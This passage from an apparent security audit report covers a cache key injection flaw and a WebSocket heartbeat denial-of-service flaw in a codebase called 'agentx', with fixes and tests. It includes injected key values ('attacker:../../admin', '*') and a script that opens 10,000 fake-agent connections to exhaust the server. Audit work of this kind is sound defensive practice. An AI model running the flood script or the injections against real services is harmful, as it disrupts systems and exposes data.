  # Cache key becomes: "agentx:agent:attacker:../../admin:profile"
  # Depending on Redis commands used, might access other keys
  
  # Or with pattern matching:
  # await cache.invalidate_pattern(f"agentx:agent:{agent_did}:*")
  # With agent_did = "*" → deletes ALL agent caches
  ```

- **Fix:**
  ```python
  # File: src/cache.py
  
  import re
  
  # Safe key characters
  SAFE_KEY_PATTERN = re.compile(r'^[a-zA-Z0-9_\-:.]+$')
  
  @staticmethod
  def make_key(entity: str, identifier: str, suffix: str = "") -> str:
      """Generate namespaced cache key with validation
      
      Args:
          entity: Entity type (e.g., 'agent', 'post', 'trust')
          identifier: Unique identifier (e.g., agent_did, post_id)
          suffix: Optional suffix (e.g., 'profile', 'feed')
          
      Returns:
          Formatted cache key: agentx:{entity}:{identifier}:{suffix}
          
      Raises:
          ValueError: If any component contains invalid characters
      """
      components = [entity, str(identifier)]
      if suffix:
          components.append(suffix)
      
      for component in components:
          if not SAFE_KEY_PATTERN.match(component):
              raise ValueError(f"Invalid cache key component: {component}")
          if len(component) > 128:
              raise ValueError(f"Cache key component too long: {component[:20]}...")
      
      return "agentx:" + ":".join(components)
  
  async def invalidate_pattern(self, pattern: str) -> int:
      """Delete all keys matching pattern (bulk cache busting)
      
      SECURITY: Pattern must be constructed internally, never from user input
      """
      # Validate pattern doesn't contain dangerous wildcards at wrong positions
      if pattern.count("*") > 1:
          raise ValueError("Pattern can contain at most one wildcard")
      if pattern.startswith("*"):
          raise ValueError("Pattern cannot start with wildcard")
      
      # ... rest of implementation
  ```

- **Verification:**
  ```python
  def test_cache_key_injection_blocked():
      with pytest.raises(ValueError):
          CacheManager.make_key("agent", "attacker:../../admin", "profile")
      
      with pytest.raises(ValueError):
          CacheManager.make_key("agent", "*", "profile")
  
  def test_valid_keys_work():
      key = CacheManager.make_key("agent", "did:agentx:atlas-001", "profile")
      assert key == "agentx:agent:did:agentx:atlas-001:profile"
  ```

---

### [MEDIUM] F-012: WebSocket Heartbeat DoS Vector

- **Severity:** MEDIUM
- **Location:** `src/websocket/manager.py` lines 80-82 (heartbeat task creation)
- **Description:** The heartbeat loop creates an asyncio task per connection. With the documented limit of 5 connections per agent, a malicious actor could create many agents (or use the unauthenticated WebSocket bug) to spawn thousands of heartbeat tasks, exhausting server memory and CPU.

- **Attack Scenario:**
  ```python
  # Attacker opens maximum connections for many fake agents
  import asyncio
  import websockets
  
  async def dos_attack():
      connections = []
      for i in range(10000):
          ws = await websockets.connect(
              f"wss://api.agentx.ai/ws?agent_did=did:agentx:fake-{i:05d}"
          )
          connections.append(ws)
      
      # Server now has 10,000 active heartbeat tasks
      # Each task wakes every 30 seconds, consuming CPU
      await asyncio.sleep(3600)  # Hold connections open
  ```

- **Fix:**
  ```python
  # File: src/websocket/manager.py
  
  from collections import defaultdict
  import asyncio
  
  class ConnectionManager:
      def __init__(self):
          # ... existing fields ...
          
          # Global connection limit
          self._max_total_connections = 10000
          self._current_connections = 0
          
          # Per-IP connection limit (before auth)
          self._ip_connections: Dict[str, int] = defaultdict(int)
          self._max_connections_per_ip = 20
          
          # Single heartbeat task instead of per-connection
          self._heartbeat